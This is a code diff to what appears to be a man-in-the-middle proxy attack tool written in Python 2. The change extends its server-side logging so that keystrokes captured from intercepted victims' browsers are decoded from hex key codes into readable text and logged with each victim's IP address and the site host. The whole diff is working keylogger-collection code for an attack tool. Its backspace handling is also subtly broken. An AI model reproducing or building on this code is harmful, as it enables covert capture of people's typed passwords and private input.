@@ -80,7 +80,24 @@ class ServerConnection(HTTPClient):
             logging.warning(str(self.client.getClientIP()) + " Browser Profilerer data:\n" + out)
         
         elif 'keylog' in self.uri:
-            logging.warning(str(self.client.getClientIP()) + " ["+ self.headers['host'] + "] " "Keys: " + self.postData)
+            keys = self.postData.split(",")
+            del keys[0]; del(keys[len(keys)-1])
+
+            nice = ''
+            for n in keys:
+                if n == '9':
+                    nice += "<TAB>"
+                elif n == '8':
+                    nice = nice.replace(nice[-1:], "")
+                elif n == '13':
+                    nice = ''
+                else:
+                    try:
+                        nice += n.decode('hex')
+                    except:
+                        print "ERROR: unknown char " + n
+
+            logging.warning(str(self.client.getClientIP()) + " ["+ self.headers['host'] + "] " "Keys: " + nice)
         
         else:
             logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
